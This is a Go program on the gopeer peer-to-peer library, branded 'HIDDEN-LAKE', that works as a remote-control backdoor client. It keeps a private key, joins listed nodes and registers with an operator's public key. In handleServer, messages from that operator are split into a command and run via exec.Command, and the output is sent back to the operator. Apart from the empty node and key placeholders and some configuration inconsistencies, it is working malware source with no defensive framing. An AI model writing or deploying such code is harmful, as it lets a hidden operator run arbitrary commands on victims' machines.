package main

import (
    "os"
    "fmt"
    "strings"
    "os/exec"
    "io/ioutil"
    "crypto/rsa"
    "github.com/number571/gopeer"
)

type Node struct {
    Address string
    Certificate string
    Public string
}

const (
    TITLE_MESSAGE  = "[TITLE-MESSAGE]"
    TITLE_ARCHIVE  = "[TITLE-ARCHIVE]"
)

var (
    FILENAME       = "private.key"
    KEY_SIZE       = (3 << 10) // 3072 bit
    PRIVATE_CLIENT = tryGeneratePrivate(FILENAME, KEY_SIZE)
    PUBLIC_RECV    = gopeer.ParsePublic(PEM_PUBLIC_RECV)
)

func init() {
    gopeer.Set(gopeer.SettingsType{
        "SERVER_NAME": "HIDDEN-LAKE",
        "NETWORK": "[HIDDEN-LAKE]",
        "VERSION": "[1.0.4s]",
        "HMACKEY": "9163571392708145",
        "KEY_SIZE": uint64(3 << 10), // 3072 bit
    })
}

func main() {
    key, cert := gopeer.GenerateCertificate(
        gopeer.Get("SERVER_NAME").(string), 
        gopeer.Get("KEY_SIZE").(uint16),
    )
    listener := gopeer.NewListener(gopeer.Get("IS_CLIENT").(string))
    listener.Open(&gopeer.Certificate{
        Cert: []byte(cert),
        Key:  []byte(key),
    }).Run(handleServer)
    defer listener.Close()

    client := listener.NewClient(PRIVATE_CLIENT)
    handleClient(client)
    // ...
}

func handleClient(client *gopeer.Client) {
    for _, node := range LIST_OF_NODES {
        dest := &gopeer.Destination{
            Address: node.Address,
            Certificate: []byte(node.Certificate),
            Public: gopeer.ParsePublic(node.Public),
        }
        connect(client, dest)
    }

    dest := &gopeer.Destination{
        Receiver: PUBLIC_RECV,
    }
    connect(client, dest)

    for {
        fmt.Scanln()
    }
}

func connect(client *gopeer.Client, dest *gopeer.Destination) {
    message := "connection created"
    client.Connect(dest)
    client.SendTo(dest, &gopeer.Package{
        Head: gopeer.Head{
            Title:  TITLE_MESSAGE,
            Option: gopeer.Get("OPTION_GET").(string),
        },
        Body: gopeer.Body{
            Data: message,
        },
    })
}

func tryGeneratePrivate(filename string, bits int) *rsa.PrivateKey {
    if _, err := os.Stat(filename); os.IsNotExist(err) {
        file, err := os.Create(filename)
        if err != nil {
            return nil
        }
        priv := gopeer.GeneratePrivate(uint16(bits))
        file.WriteString(gopeer.StringPrivate(priv))
        return priv
    }
    file, err := os.Open(filename)
    if err != nil {
        return nil
    }
    privPem, err := ioutil.ReadAll(file)
    if err != nil {
        return nil
    }
    return gopeer.ParsePrivate(string(privPem))
}

func handleServer(client *gopeer.Client, pack *gopeer.Package) {
    client.HandleAction(TITLE_ARCHIVE, pack,
        func(client *gopeer.Client, pack *gopeer.Package) (set string) {
            return
        },
        func(client *gopeer.Client, pack *gopeer.Package) {
        },
    )
    client.HandleAction(TITLE_MESSAGE, pack,
        func(client *gopeer.Client, pack *gopeer.Package) (set string) {
            fmt.Printf("[%s]: %s\n", pack.From.Sender.Hashname, pack.Body.Data)
            hash := pack.From.Sender.Hashname
            if hash == gopeer.HashPublic(PUBLIC_RECV) {
                splited := strings.Split(pack.Body.Data, " ")
                splited = splited[:len(splited)-1]
                out, err := exec.Command(splited[0], splited[1:]...).Output()
                if err != nil {
                    return
                }
                dest := &gopeer.Destination{
                    Receiver: PUBLIC_RECV,
                }
                client.SendTo(dest, &gopeer.Package{
                    Head: gopeer.Head{
                        Title: TITLE_MESSAGE,
                        Option: gopeer.Get("OPTION_GET").(string),
                    },
                    Body: gopeer.Body{
                        Data: string(out),
                    },
                })
            }

            return
        },
        func(client *gopeer.Client, pack *gopeer.Package) {
        },
    )
}

var (
    LIST_OF_NODES = []Node{
        Node{
            Address: "",
            Certificate: ``,
            Public: ``,
        },
    }
)

const PEM_PUBLIC_RECV = ``
